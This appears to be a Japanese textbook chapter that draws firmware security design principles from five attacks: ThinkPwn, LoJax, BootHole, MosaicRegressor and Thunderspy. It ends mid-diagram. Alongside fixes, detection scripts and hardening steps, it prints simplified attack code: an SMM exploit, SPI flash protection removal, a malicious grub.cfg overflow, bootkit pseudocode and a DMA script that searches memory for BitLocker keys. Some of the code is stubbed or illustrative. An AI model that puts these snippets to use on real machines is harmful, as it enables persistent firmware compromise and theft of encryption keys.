# 攻撃事例から学ぶ設計原則

🎯 **この章で学ぶこと**
- 実際に発生したファームウェア攻撃の詳細分析
- 各攻撃から導かれるセキュリティ設計原則
- 脆弱性パターンの理解と対策手法
- Defense in Depth の実践的応用
- インシデントレスポンスとフォレンジック手法

📚 **前提知識**
- [UEFI Secure Boot の仕組み](03-secure-boot-architecture.md)
- [TPM と Measured Boot](04-tpm-and-measured-boot.md)
- [Intel Boot Guard の役割と仕組み](05-intel-boot-guard.md)
- [SMM の仕組みとセキュリティ](08-smm-security.md)

---

## セキュリティインシデント分析の重要性

ファームウェアセキュリティの設計原則は、実際の攻撃事例から学ぶことが最も効果的です。本章では過去10年間に発生した重要なファームウェア攻撃を詳しく分析し、そこから導かれる普遍的な設計原則を抽出します。

### インシデントから学ぶべき3つの視点

```mermaid
graph TB
    A[セキュリティインシデント] --> B[技術的分析]
    A --> C[組織的対応]
    A --> D[設計原則の抽出]

    B --> B1[脆弱性の根本原因]
    B --> B2[攻撃手法の詳細]
    B --> B3[検出・防御メカニズムの不備]

    C --> C1[発見経緯]
    C --> C2[パッチ配布プロセス]
    C --> C3[エコシステム全体への影響]

    D --> D1[技術的対策]
    D --> D2[プロセス改善]
    D --> D3[アーキテクチャ改善]
```



---

## Case Study 1: ThinkPwn (CVE-2016-3287)

### 概要

**発生年**: 2016年
**影響範囲**: Lenovo ThinkPad/ThinkCentre/ThinkStation（数百万台）
**脆弱性タイプ**: SMM Privilege Escalation
**CVSS Score**: 7.2 (High)
**発見者**: Dmytro Oleksiuk (cr4sh)

### 脆弱性の詳細

Lenovo の SystemSmmRuntimeRt ドライバに、SMM 外部からの任意メモリ書き込みを許す脆弱性が存在しました。

#### 脆弱なコードパターン

```c
// SystemSmmRuntimeRt.c（脆弱なバージョン）
EFI_STATUS
EFIAPI
SmmRuntimeHandler (
  IN     EFI_HANDLE  DispatchHandle,
  IN     CONST VOID  *Context OPTIONAL,
  IN OUT VOID        *CommBuffer OPTIONAL,
  IN OUT UINTN       *CommBufferSize OPTIONAL
  )
{
  RUNTIME_FUNCTION_PARAM  *Param;

  // 1. CommBuffer のポインタ検証なし
  Param = (RUNTIME_FUNCTION_PARAM *) CommBuffer;

  // 2. DestAddress の検証なし（SMRAM外であることを確認していない）
  switch (Param->FunctionCode) {
    case RUNTIME_FUNCTION_SET_VARIABLE:
      // 3. 任意のアドレスへの書き込みを許可
      CopyMem (
        (VOID *) Param->DestAddress,  // 攻撃者が制御可能
        (VOID *) Param->SourceData,   // 攻撃者が制御可能
        Param->DataSize               // 攻撃者が制御可能
      );
      break;
  }

  return EFI_SUCCESS;
}
```

#### 攻撃シナリオ



```mermaid
sequenceDiagram
    participant Attacker as 攻撃者（OS）
    participant SMI as SMI Handler
    participant SMRAM as SMRAM
    participant Kernel as Kernel Space

    Attacker->>Attacker: CommBuffer を細工<br/>(DestAddress = CR3)
    Attacker->>SMI: port 0xB2 に書き込み<br/>（SMI トリガー）
    SMI->>SMRAM: SmmRuntimeHandler 実行
    SMRAM->>SMRAM: ポインタ検証なし<br/>（脆弱性！）
    SMRAM->>Kernel: CopyMem で CR3 レジスタ値を改竄
    Kernel-->>Attacker: ページテーブル制御を奪取
    Attacker->>Attacker: カーネルメモリを<br/>任意に読み書き
```

#### 攻撃コード（PoC）

```c
// ThinkPwn exploit (simplified)
#include <ntddk.h>

typedef struct {
  UINT32  FunctionCode;
  UINT64  DestAddress;     // 書き込み先
  UINT64  SourceData;      // 書き込むデータ
  UINT32  DataSize;
} RUNTIME_FUNCTION_PARAM;

VOID ExploitThinkPwn(VOID) {
  RUNTIME_FUNCTION_PARAM  *Param;
  UINT64                  Cr3Value;

  // 1. CommBuffer を OS メモリに確保
  Param = AllocatePool(sizeof(RUNTIME_FUNCTION_PARAM));

  // 2. CR3 レジスタのアドレスを取得（物理アドレス）
  Cr3Value = __readcr3();

  // 3. ページテーブルを細工したデータを準備
  UINT64 MaliciousPageTable = PrepareMaliciousPageTable();

  // 4. SMI パラメータを設定
  Param->FunctionCode = RUNTIME_FUNCTION_SET_VARIABLE;
  Param->DestAddress  = 0x1000;  // CR3 が指すページテーブルエントリ
  Param->SourceData   = MaliciousPageTable;
  Param->DataSize     = 8;

  // 5. CommBuffer のアドレスを共有メモリに設定
  WriteToSmmCommunicationRegion(Param);

  // 6. SMI をトリガー
  __outbyte(0xB2, 0xXX);  // Lenovo 固有の SMI コマンド

  // 7. ページテーブルが改竄され、カーネルメモリに書き込み可能に
  WriteToKernelMemory(TARGET_ADDRESS, PAYLOAD, SIZE);
}
```

### 修正方法

```c
// SystemSmmRuntimeRt.c（修正版）
EFI_STATUS
EFIAPI
SecureSmmRuntimeHandler (
  IN     EFI_HANDLE  DispatchHandle,
  IN     CONST VOID  *Context OPTIONAL,
  IN OUT VOID        *CommBuffer OPTIONAL,
  IN OUT UINTN       *CommBufferSize OPTIONAL
  )
{
  RUNTIME_FUNCTION_PARAM  *Param;
  RUNTIME_FUNCTION_PARAM  LocalParam;
  EFI_STATUS              Status;

  // 1. CommBuffer 検証
  if (CommBuffer == NULL || CommBufferSize == NULL) {
    return EFI_INVALID_PARAMETER;
  }

  // 2. CommBuffer が SMRAM 外であることを確認
  if (!SmmIsBufferOutsideSmram(CommBuffer, sizeof(RUNTIME_FUNCTION_PARAM))) {
    DEBUG((DEBUG_ERROR, "CommBuffer points to SMRAM!\n"));
    return EFI_SECURITY_VIOLATION;
  }

  // 3. TOCTOU 攻撃を防ぐため、ローカルコピーを作成
  CopyMem(&LocalParam, CommBuffer, sizeof(RUNTIME_FUNCTION_PARAM));

  // 4. パラメータ検証
  if (LocalParam.DataSize > MAX_ALLOWED_SIZE) {
    return EFI_INVALID_PARAMETER;
  }

  // 5. DestAddress が SMRAM を指していないか確認
  if (!SmmIsBufferOutsideSmram(
        (VOID *)(UINTN)LocalParam.DestAddress,
        LocalParam.DataSize)) {
    DEBUG((DEBUG_ERROR, "DestAddress points to SMRAM!\n"));
    return EFI_SECURITY_VIOLATION;
  }

  // 6. 許可された操作のみ実行
  switch (LocalParam.FunctionCode) {
    case RUNTIME_FUNCTION_SET_VARIABLE:
      // 7. ホワイトリストで許可されたアドレス範囲のみ書き込み許可
      if (!IsAddressInAllowedRange(LocalParam.DestAddress)) {
        return EFI_ACCESS_DENIED;
      }

      CopyMem(
        (VOID *)(UINTN)LocalParam.DestAddress,
        (VOID *)(UINTN)LocalParam.SourceData,
        LocalParam.DataSize
      );
      break;

    default:
      return EFI_UNSUPPORTED;
  }

  return EFI_SUCCESS;
}
```

### 学んだ教訓

| 教訓 | 設計原則 | 実装方法 |
|------|---------|---------|
| SMM ハンドラは最小特権で動作すべき | Principle of Least Privilege | ホワイトリスト方式でアクセス可能なメモリ範囲を制限 |
| すべての外部入力を検証せよ | Input Validation | SmmIsBufferOutsideSmram() で徹底検証 |
| TOCTOU 攻撃を考慮せよ | Atomic Operations | ローカルコピーで処理 |
| 防御を多層化せよ | Defense in Depth | ポインタ検証 + サイズ検証 + 範囲検証 |

---

## Case Study 2: LoJax (2018)

### 概要

**発生年**: 2018年
**攻撃者**: APT28 (Fancy Bear, ロシア政府関連)
**影響範囲**: 東欧政府機関
**脆弱性タイプ**: UEFI Rootkit
**特徴**: 世界初の野生で確認された UEFI マルウェア

### 攻撃フロー

```mermaid
graph TB
    A[初期侵入] --> B[権限昇格]
    B --> C[SPI Flash 保護解除]
    C --> D[UEFI モジュール挿入]
    D --> E[永続化完了]

    C --> C1[WP# ピン無効化]
    C --> C2[BIOSWE/BLE ビット設定]
    C --> C3[Protected Range 解除]

    D --> D1[RwDrv.efi 書き込み]
    D --> D2[ブートチェーンに組み込み]

    E --> E1[OS 再インストール後も生存]
    E --> E2[ディスク交換後も生存]
```



### 技術的詳細

#### Phase 1: SPI Flash 保護の解除

```c
// LoJax が使用した保護解除コード（逆コンパイル）
BOOLEAN DisableFlashProtection(VOID) {
  UINT32  BiosControl;
  UINT32  SpiBase;

  // 1. PCH の SPIBAR を取得
  SpiBase = PciRead32(PCI_LIB_ADDRESS(0, 31, 5, 0x10)) & 0xFFFFF000;

  // 2. BIOS Control Register を読み取り
  BiosControl = MmioRead8(SpiBase + R_PCH_SPI_BC);

  // 3. 保護ビットをクリア
  BiosControl |= B_PCH_SPI_BC_WPD;   // Write Protect Disable
  BiosControl |= B_PCH_SPI_BC_BIOSWE; // BIOS Write Enable
  BiosControl &= ~B_PCH_SPI_BC_BLE;   // BIOS Lock Disable

  // 4. 変更を書き込み
  MmioWrite8(SpiBase + R_PCH_SPI_BC, (UINT8)BiosControl);

  // 5. Protected Range レジスタをクリア
  for (int i = 0; i < 5; i++) {
    MmioWrite32(SpiBase + R_PCH_SPI_PR0 + (i * 4), 0);
  }

  return TRUE;
}
```

#### Phase 2: UEFI モジュールの挿入

LoJax は以下のモジュールを SPI Flash に書き込みました：

```
DXE Volume:
├── RwDrv.efi          ← 悪意のあるドライバ
│   ├── Protocol: gRwDrvProtocolGuid
│   └── Function: 任意のメモリ読み書き
│
└── RwLdr.efi          ← ローダー
    ├── Dependency: RwDrv.efi
    └── Function: OS カーネルにペイロード注入
```

**RwDrv.efi の疑似コード**:

```c
// RwDrv.efi - 任意メモリアクセスドライバ
EFI_STATUS
EFIAPI
RwDrvEntry (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{
  EFI_STATUS  Status;

  // 1. カスタムプロトコルをインストール
  Status = gBS->InstallProtocolInterface(
    &ImageHandle,
    &gRwDrvProtocolGuid,
    EFI_NATIVE_INTERFACE,
    &mRwDrvProtocol
  );

  // 2. ExitBootServices フックを設定
  Status = gBS->CreateEvent(
    EVT_SIGNAL_EXIT_BOOT_SERVICES,
    TPL_NOTIFY,
    OnExitBootServices,
    NULL,
    &mExitBootServicesEvent
  );

  return EFI_SUCCESS;
}

// OS 起動直前のフック
VOID
EFIAPI
OnExitBootServices (
  IN EFI_EVENT  Event,
  IN VOID       *Context
  )
{
  // 3. OS カーネルイメージを探索
  VOID  *KernelBase = FindKernelImage();

  // 4. カーネルの Import Address Table を改竄
  PatchKernelIAT(KernelBase);

  // 5. ペイロードを注入
  InjectPayload(KernelBase);
}
```

### 検出方法

#### chipsec による検出

```bash
# BIOS 保護状態の確認
sudo chipsec_main -m common.bios_wp

# UEFI モジュールのスキャン
sudo chipsec_main -m tools.uefi.scan_image -a dump

# 不審なモジュールの検出
sudo chipsec_main -m tools.uefi.whitelist -a generate,list.json
```

#### UEFI モジュールのハッシュ検証

```python
# verify_uefi_modules.py
import hashlib
import pefile

def verify_uefi_module(module_path, known_hashes):
    """UEFI モジュールのハッシュを既知のハッシュと比較"""
    with open(module_path, 'rb') as f:
        data = f.read()

    # Authenticode 署名を除いてハッシュ計算
    pe = pefile.PE(data=data)

    # Checksum と Certificate Table を除外
    cert_entry = pe.OPTIONAL_HEADER.DATA_DIRECTORY[
        pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']
    ]

    if cert_entry.VirtualAddress > 0:
        unsigned_data = data[:cert_entry.VirtualAddress]
    else:
        unsigned_data = data

    module_hash = hashlib.sha256(unsigned_data).hexdigest()

    if module_hash not in known_hashes:
        print(f"[!] Unknown module: {module_path}")
        print(f"    SHA256: {module_hash}")
        return False

    return True

# ベンダー公式のハッシュリスト
KNOWN_HASHES = {
    "a1b2c3d4...": "LenovoSetup.efi",
    "e5f6g7h8...": "IntelGopDriver.efi",
    # ...
}

# すべての DXE ドライバを検証
for module in extract_dxe_modules("bios.bin"):
    verify_uefi_module(module, KNOWN_HASHES)
```

### 防御策

| レイヤー | 対策 | 実装 |
|---------|------|------|
| **ハードウェア** | SPI Flash 書き込み保護 | WP# ピンのプルダウン抵抗 |
| **ファームウェア** | Boot Guard 有効化 | OTP Fuse でプロビジョニング |
| **OS** | UEFI ランタイムサービス無効化 | `efi=noruntime` カーネルパラメータ |
| **検知** | インテグリティチェック | TPM Measured Boot + Remote Attestation |

### 学んだ教訓

1. **物理的な書き込み保護が必須**: ソフトウェアだけの保護は攻撃者が OS レベルの権限を取得すると無効化される
2. **Verified Boot の重要性**: Boot Guard/PSP によるハードウェアベースの検証が必要
3. **ホワイトリスト方式の採用**: 既知の正常なモジュールのみ実行を許可
4. **継続的な監視**: TPM PCR 値の定期的な検証が攻撃の早期発見につながる

---

## Case Study 3: BootHole (CVE-2020-10713)

### 概要

**発生年**: 2020年
**影響範囲**: Linux, Windows, ESXi, Xen（数億台）
**脆弱性タイプ**: GRUB2 Buffer Overflow → Secure Boot Bypass
**CVSS Score**: 8.2 (High)
**発見者**: Eclypsium

### 脆弱性の詳細

GRUB2 の設定ファイル (grub.cfg) パーサーにバッファオーバーフローが存在し、Secure Boot を迂回して任意コードを実行可能でした。

#### 脆弱なコード

```c
// grub-core/normal/main.c (脆弱なバージョン)
static grub_err_t
grub_cmd_set (struct grub_command *cmd __attribute__ ((unused)),
              int argc, char **args)
{
  char *var;
  char *val;
  char buf[1024];  // 固定サイズバッファ

  if (argc < 1)
    return grub_error (GRUB_ERR_BAD_ARGUMENT, "no variable specified");

  var = args[0];

  if (argc == 1) {
    val = grub_env_get (var);
    if (val)
      grub_printf ("%s=%s\n", var, val);
    else
      return grub_error (GRUB_ERR_FILE_NOT_FOUND, "variable not found");
  } else {
    // バッファオーバーフローの脆弱性
    grub_strcpy (buf, args[1]);  // サイズチェックなし！
    grub_env_set (var, buf);
  }

  return 0;
}
```

#### 攻撃シナリオ



```mermaid
sequenceDiagram
    participant A as 攻撃者
    participant ESP as EFI System Partition
    participant Shim as shim.efi
    participant GRUB as grub.efi
    participant Kernel as Linux Kernel

    A->>ESP: grub.cfg を改竄<br/>(長大な文字列を設定)
    A->>A: システム再起動
    Shim->>Shim: Secure Boot 検証<br/>(GRUB の署名は正常)
    Shim->>GRUB: 実行開始
    GRUB->>GRUB: grub.cfg を読み込み
    GRUB->>GRUB: バッファオーバーフロー<br/>リターンアドレス改竄
    GRUB->>GRUB: シェルコード実行
    GRUB->>Kernel: 署名なしカーネルをロード<br/>(Secure Boot 迂回)
    Kernel-->>A: ルートキット動作開始
```

#### PoC (Proof of Concept)

```bash
# grub.cfg に悪意のあるエントリを追加
cat <<EOF >> /boot/efi/EFI/ubuntu/grub.cfg
set some_var="$(python3 -c 'print("A" * 2000)')"
menuentry "Pwned Kernel" {
    linux /vmlinuz-pwned root=/dev/sda1
    initrd /initrd-pwned.img
}
EOF

# 次回起動時にバッファオーバーフローが発生
# リターンアドレスを制御し、任意のコードを実行
```

### 攻撃の成立条件

1. **書き込み権限**: ESP (EFI System Partition) への書き込み権限（通常は root）
2. **物理アクセス**: または OS レベルの管理者権限
3. **Secure Boot 有効**: パラドックスだが、Secure Boot が有効でないと攻撃の価値が低い

### 修正方法

```c
// grub-core/normal/main.c (修正版)
static grub_err_t
grub_cmd_set (struct grub_command *cmd __attribute__ ((unused)),
              int argc, char **args)
{
  char *var;
  char *val;

  if (argc < 1)
    return grub_error (GRUB_ERR_BAD_ARGUMENT, "no variable specified");

  var = args[0];

  // 変数名の長さチェック
  if (grub_strlen (var) > GRUB_ENV_VAR_MAX_LEN) {
    return grub_error (GRUB_ERR_BAD_ARGUMENT,
                       "variable name too long");
  }

  if (argc == 1) {
    val = grub_env_get (var);
    if (val)
      grub_printf ("%s=%s\n", var, val);
    else
      return grub_error (GRUB_ERR_FILE_NOT_FOUND,
                         "variable not found");
  } else {
    // 値の長さチェック
    if (grub_strlen (args[1]) > GRUB_ENV_VAL_MAX_LEN) {
      return grub_error (GRUB_ERR_BAD_ARGUMENT,
                         "variable value too long");
    }

    // 安全な文字列操作
    grub_env_set (var, args[1]);
  }

  return 0;
}
```

### エコシステム全体への影響

BootHole の修正には複雑な連鎖的対応が必要でした：

```mermaid
graph TB
    A[GRUB2 修正版リリース] --> B[新しい GRUB2 に署名]
    B --> C[古い GRUB2 を dbx に追加]

    C --> D[Microsoft UEFI CA dbx 更新]
    D --> E[Windows Update 配布]
    D --> F[Linux ディストリビューション対応]

    F --> F1[Ubuntu: shim 更新]
    F --> F2[Fedora: shim 更新]
    F --> F3[Debian: shim 更新]

    C --> G[問題: 古いシステムが起動不能に]
    G --> H[回避策: Secure Boot 無効化]

    style G fill:#f99,stroke:#f00
    style H fill:#ff9,stroke:#f90
```



### 対応の課題

| 課題 | 詳細 | 解決策 |
|------|------|--------|
| **後方互換性** | 古い GRUB2 を dbx に追加すると古いシステムが起動不能 | 段階的な dbx 更新 + ユーザー通知 |
| **更新の遅延** | BIOS ベンダーの対応に時間がかかる | OEM からの定期的な更新推奨 |
| **組み込みシステム** | 更新メカニズムがないデバイスが多数存在 | ハードウェア交換が必要なケースも |
| **サプライチェーン** | 複数の主体（Microsoft, Canonical, OEM）が関与 | 調整されたリリーススケジュール |

### 学んだ教訓

1. **信頼の連鎖は最も弱い部分で破綻する**: Secure Boot の信頼チェーンの一部（GRUB2）が脆弱だと全体が無効化される
2. **設定ファイルも攻撃対象**: grub.cfg のような「データ」も入力検証が必須
3. **エコシステム全体での対応が必要**: 単一コンポーネントの修正では不十分
4. **dbx 管理の難しさ**: 失効リストの更新は慎重に行う必要がある

---

## Case Study 4: MosaicRegressor (2020)

### 概要

**発生年**: 2020年
**攻撃者**: 不明（高度な APT グループ）
**影響範囲**: アフリカ・アジアの外交官、NGO
**脆弱性タイプ**: UEFI Bootkit
**特徴**: 複数のファームウェアモジュールを組み合わせた高度な持続型攻撃

### 攻撃アーキテクチャ

```mermaid
graph TB
    subgraph "SPI Flash"
        A[VectorEDK UEFI ドライバ]
    end

    subgraph "OS Runtime"
        B[IntelUpdate.exe]
        C[mshtmled.dll]
        D[mosaic.exe]
    end

    subgraph "C&C Infrastructure"
        E[C&C Server]
    end

    A -->|DXE 段階で起動| B
    B -->|DLL インジェクション| C
    C -->|永続化| D
    D <-->|通信| E

    style A fill:#f99,stroke:#f00
    style B fill:#f99,stroke:#f00
    style C fill:#f99,stroke:#f00
    style D fill:#f99,stroke:#f00
```



### 技術的詳細

#### VectorEDK ドライバの動作

```c
// VectorEDK 疑似コード（解析結果）
EFI_STATUS
EFIAPI
VectorEntry (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{
  EFI_STATUS  Status;
  VOID        *Payload;
  UINTN       PayloadSize;

  // 1. SPI Flash から暗号化されたペイロードを読み取り
  Payload = ReadFromSpiFlash(PAYLOAD_OFFSET, &PayloadSize);

  // 2. 復号化（XOR ベースの簡易暗号）
  DecryptPayload(Payload, PayloadSize, HARDCODED_KEY);

  // 3. EFI System Partition に書き込み
  Status = WriteToEsp(L"\\EFI\\Microsoft\\Boot\\IntelUpdate.exe",
                      Payload,
                      PayloadSize);

  // 4. レジストリ Run キーに追加（OS 起動時に実行）
  Status = AddToStartup(L"IntelUpdate.exe");

  // 5. 痕跡を消去
  FreePool(Payload);

  return EFI_SUCCESS;
}

VOID
DecryptPayload (
  IN OUT UINT8  *Data,
  IN UINTN      Size,
  IN UINT32     Key
  )
{
  // 単純な XOR 暗号化
  for (UINTN i = 0; i < Size; i++) {
    Data[i] ^= (UINT8)(Key >> ((i % 4) * 8));
  }
}
```

#### 永続化メカニズム

1. **UEFI レベル**: SPI Flash に VectorEDK を埋め込み（OS 再インストールでも生存）
2. **OS レベル**: ESP に IntelUpdate.exe を配置（ディスク交換でも生存）
3. **プロセスレベル**: 正規プロセスへの DLL インジェクション（検出回避）

### 検出の難しさ

| 検出手法 | 結果 | 理由 |
|---------|------|------|
| ファイルシステムスキャン | ❌ 失敗 | ESP はデフォルトでマウントされない |
| アンチウイルス | ❌ 失敗 | UEFI 段階では AV は動作していない |
| ネットワーク監視 | △ 部分的 | 通信は暗号化され、正規トラフィックに偽装 |
| メモリフォレンジック | △ 部分的 | DLL インジェクションは正規プロセス内で動作 |
| chipsec スキャン | ✅ 成功 | UEFI モジュールの異常を検出可能 |

### フォレンジック手法

#### SPI Flash のダンプと解析

```bash
# 1. flashrom で SPI Flash をダンプ
sudo flashrom -p internal -r bios_dump.bin

# 2. UEFITool で UEFI ボリュームを抽出
UEFITool bios_dump.bin

# 3. 不審なドライバを検索
python3 uefi_scanner.py --input bios_dump.bin --suspicious

# 4. ドライバの逆アセンブル
objdump -D -b binary -m i386:x86-64 suspicious_driver.efi > driver.asm

# 5. 文字列解析
strings -el suspicious_driver.efi | grep -i "\.exe\|\.dll\|http"
```

#### 自動検出スクリプト

```python
# mosaic_detector.py
import os
import hashlib
import pefile

def check_esp_for_malware():
    """EFI System Partition をスキャン"""
    esp_paths = [
        "/boot/efi",
        "C:\\EFI",
        "/Volumes/EFI"
    ]

    suspicious_files = []

    for esp in esp_paths:
        if not os.path.exists(esp):
            continue

        for root, dirs, files in os.walk(esp):
            for file in files:
                if file.endswith('.exe') or file.endswith('.dll'):
                    full_path = os.path.join(root, file)

                    # MosaicRegressor の既知のハッシュと比較
                    file_hash = hashlib.sha256(
                        open(full_path, 'rb').read()
                    ).hexdigest()

                    if file_hash in KNOWN_MALWARE_HASHES:
                        suspicious_files.append((full_path, file_hash))

                    # PE ファイルのインポートテーブルを確認
                    try:
                        pe = pefile.PE(full_path)
                        for entry in pe.DIRECTORY_ENTRY_IMPORT:
                            dll_name = entry.dll.decode('utf-8').lower()

                            # 不審な API 使用パターン
                            if dll_name in ['wininet.dll', 'ws2_32.dll']:
                                for imp in entry.imports:
                                    if imp.name and b'Http' in imp.name:
                                        print(f"[!] Suspicious network API: "
                                              f"{full_path} -> {imp.name}")
                    except:
                        pass

    return suspicious_files

# 実行
results = check_esp_for_malware()
if results:
    print("[CRITICAL] Potential MosaicRegressor infection detected:")
    for path, hash_val in results:
        print(f"  - {path} (SHA256: {hash_val})")
```

### 防御策

```c
// UEFI ドライバのホワイトリスト検証
EFI_STATUS
EFIAPI
ValidateUefiDriver (
  IN EFI_HANDLE  ImageHandle
  )
{
  EFI_STATUS                     Status;
  EFI_LOADED_IMAGE_PROTOCOL      *LoadedImage;
  VOID                           *ImageBase;
  UINTN                          ImageSize;
  UINT8                          ImageHash[32];

  // 1. ロードされたイメージ情報を取得
  Status = gBS->HandleProtocol(
    ImageHandle,
    &gEfiLoadedImageProtocolGuid,
    (VOID **)&LoadedImage
  );
  if (EFI_ERROR(Status)) {
    return Status;
  }

  ImageBase = LoadedImage->ImageBase;
  ImageSize = LoadedImage->ImageSize;

  // 2. SHA-256 ハッシュを計算
  Sha256HashAll(ImageBase, ImageSize, ImageHash);

  // 3. ホワイトリストと照合
  if (!IsHashInWhitelist(ImageHash)) {
    DEBUG((DEBUG_ERROR, "Unknown driver detected!\n"));
    DEBUG((DEBUG_ERROR, "SHA256: %02x%02x%02x%02x...\n",
           ImageHash[0], ImageHash[1], ImageHash[2], ImageHash[3]));

    // 4. ロードを拒否
    return EFI_SECURITY_VIOLATION;
  }

  return EFI_SUCCESS;
}
```

### 学んだ教訓

1. **ESP も監視対象**: EFI System Partition は見過ごされがちだが、攻撃者の格好の標的
2. **多層防御の重要性**: UEFI レベル + OS レベル + ネットワークレベルの検知が必要
3. **署名検証だけでは不十分**: カスタムドライバは署名なしで動作する可能性（ベンダーによる）
4. **フォレンジックツールの整備**: UEFI レベルの解析ツールが必須

---

## Case Study 5: Thunderspy (2020)

### 概要

**発生年**: 2020年
**影響範囲**: 2011-2020年製の Thunderbolt 搭載 PC
**脆弱性タイプ**: DMA Attack via Thunderbolt
**発見者**: Björn Ruytenberg (Eindhoven University of Technology)

### DMA 攻撃の原理

```mermaid
graph LR
    subgraph "攻撃者のデバイス"
        A[悪意のある Thunderbolt デバイス]
    end

    subgraph "被害者の PC"
        B[Thunderbolt Controller]
        C[PCIe Bus]
        D[System Memory]
        E[CPU]
    end

    A -->|Thunderbolt ケーブル| B
    B -->|DMA リクエスト| C
    C -->|メモリアクセス| D
    D -.制御奪取.-> E

    style A fill:#f99,stroke:#f00
```



### 攻撃シナリオ

#### Thunderspy の攻撃手順

1. **物理アクセス**: ロックされたラップトップに Thunderbolt ポート経由で接続
2. **Security Level の改竄**: SPI Flash Controller Firmware を書き換え
3. **DMA 経由でメモリアクセス**: IOMMU を迂回して System RAM を読み書き
4. **認証情報の窃取**: BitLocker キー、ログインパスワードハッシュなどを取得

#### PoC コード

```python
# thunderspy_dma.py - DMA 経由でメモリをスキャン
import struct
import time

class ThunderboltDMA:
    def __init__(self, pci_device="/dev/thunderbolt0"):
        self.device = pci_device
        self.fd = None

    def open(self):
        """Thunderbolt DMA チャネルを開く"""
        # 実際の実装は Thunderbolt プロトコルに依存
        self.fd = open(self.device, 'r+b')

    def read_memory(self, physical_address, size):
        """物理メモリから読み取り"""
        # DMA Read コマンドを送信
        cmd = struct.pack('<BIQ',
                          0x01,  # READ_MEM コマンド
                          size,
                          physical_address)
        self.fd.write(cmd)

        # データを受信
        return self.fd.read(size)

    def write_memory(self, physical_address, data):
        """物理メモリに書き込み"""
        cmd = struct.pack('<BIQ',
                          0x02,  # WRITE_MEM コマンド
                          len(data),
                          physical_address)
        self.fd.write(cmd + data)

    def scan_for_bitlocker_key(self):
        """メモリ内の BitLocker FVEK を検索"""
        # BitLocker FVEK は特定のパターンで識別可能
        fvek_pattern = b'\x2c\x00\x00\x00\x01\x00\x00\x00'

        # 低位メモリをスキャン（0-4GB）
        for addr in range(0, 0x100000000, 0x1000):  # 4KB ずつ
            try:
                data = self.read_memory(addr, 0x1000)
                if fvek_pattern in data:
                    offset = data.find(fvek_pattern)
                    fvek = data[offset:offset+64]
                    print(f"[+] Potential BitLocker FVEK at 0x{addr+offset:x}")
                    print(f"    {fvek.hex()}")
            except:
                pass

        return None

# 攻撃を実行（要 root 権限）
dma = ThunderboltDMA()
dma.open()
dma.scan_for_bitlocker_key()
```

### 脆弱性の根本原因

| 問題 | 詳細 | 影響 |
|------|------|------|
| **Security Level 検証の不備** | Thunderbolt Controller Firmware が書き換え可能 | 認証を完全に迂回可能 |
| **IOMMU 未使用** | Intel VT-d が無効またはサポート外 | DMA 保護が機能しない |
| **Kernel DMA Protection 未対応** | Windows 10 1803 以前は未サポート | OS レベルの保護なし |

### 修正と緩和策

#### ハードウェア対策: Kernel DMA Protection

```c
// Windows Kernel DMA Protection の疑似コード
BOOLEAN
KdpValidateDmaDevice (
  IN PCI_DEVICE  *Device
  )
{
  // 1. デバイスが事前認証済みか確認
  if (!IsPciDevicePreAuthorized(Device)) {
    DEBUG((DEBUG_INFO, "DMA device not pre-authorized\n"));
    return FALSE;
  }

  // 2. IOMMU で保護された領域のみアクセス許可
  SetupIommuProtection(Device);

  // 3. ExitBootServices 後は新規デバイス拒否
  if (gExitBootServicesCalled) {
    DEBUG((DEBUG_WARN, "DMA device plugged after boot - rejected\n"));
    return FALSE;
  }

  return TRUE;
}
```

#### UEFI 設定での対策

```
# BIOS Setup での推奨設定
Thunderbolt Security Level: User Authorization (最低でも)
Intel VT-d: Enabled
Kernel DMA Protection: Enabled（Windows 10 1803+）
```

#### Linux での IOMMU 有効化

```bash
# /etc/default/grub に追加
GRUB_CMDLINE_LINUX="intel_iommu=on iommu=pt"

# 設定を更新
sudo update-grub
sudo reboot

# IOMMU が有効か確認
dmesg | grep -i iommu
# 出力例: DMAR: Intel(R) Virtualization Technology for Directed I/O
```

### 検証スクリプト

```bash
#!/bin/bash
# check_dma_protection.sh - DMA 保護状態の確認

echo "=== DMA Protection Status ==="

# 1. IOMMU の状態確認
if [ -d "/sys/class/iommu" ]; then
    echo "[+] IOMMU is enabled"
    ls /sys/class/iommu/
else
    echo "[-] IOMMU is NOT enabled - vulnerable to DMA attacks!"
fi

# 2. Thunderbolt Security Level 確認
if [ -d "/sys/bus/thunderbolt" ]; then
    for domain in /sys/bus/thunderbolt/devices/domain*; do
        if [ -f "$domain/security" ]; then
            level=$(cat "$domain/security")
            echo "[*] Thunderbolt Security Level: $level"

            if [ "$level" == "none" ] || [ "$level" == "dponly" ]; then
                echo "    [!] WARNING: Weak security level!"
            fi
        fi
    done
fi

# 3. Kernel DMA Protection 確認（Windows の場合）
if command -v powershell.exe &> /dev/null; then
    powershell.exe -Command "Get-CimInstance -Namespace root/Microsoft/Windows/DeviceGuard -ClassName Win32_DeviceGuard | Select -ExpandProperty VirtualizationBasedSecurityProperties"
fi

echo "=========================="
```

### 学んだ教訓

1. **物理アクセスの脅威を過小評価しない**: "Evil Maid" 攻撃は現実的な脅威
2. **IOMMU は必須**: DMA 可能なデバイスには必ず IOMMU で保護を
3. **Security Level の適切な設定**: Thunderbolt は便利だがセキュリティリスクも大きい
4. **ファームウェアの改竄検知**: Thunderbolt Controller Firmware の整合性検証が必要

---

## 攻撃パターンの分類と対策マトリクス

### 攻撃ベクトルの分類

| 攻撃タイプ | 攻撃対象 | 必要な権限 | 代表的事例 | 対策 |
|----------|---------|----------|----------|------|
| **SMM Exploitation** | SMM ハンドラの脆弱性 | OS 管理者 | ThinkPwn | SmmIsBufferOutsideSmram, SMM_BWP |
| **UEFI Rootkit** | SPI Flash | OS 管理者 | LoJax, MosaicRegressor | Boot Guard, WP# ピン |
| **Bootloader Vulnerability** | GRUB2/Shim | ESP 書き込み | BootHole | Secure Boot, dbx 更新 |
| **DMA Attack** | Thunderbolt/PCIe | 物理アクセス | Thunderspy | IOMMU, Kernel DMA Protection |
| **Supply Chain** | 製造/流通段階 | 内部犯行 | SuperMicro 疑惑 | 検査プロセス強化 |

### Defense in Depth 戦略

```mermaid
graph TD
    A[多層防御] --> B[予防]
    A --> C[検出]
    A --> D[対応]

    B --> B1[Secure Boot]
    B --> B2[Boot Guard/PSP]
    B --> B3[SPI Flash 保護]
    B --> B4[IOMMU]
    B --> B5[SMM 保護]

    C --> C1[TPM Measured Boot]
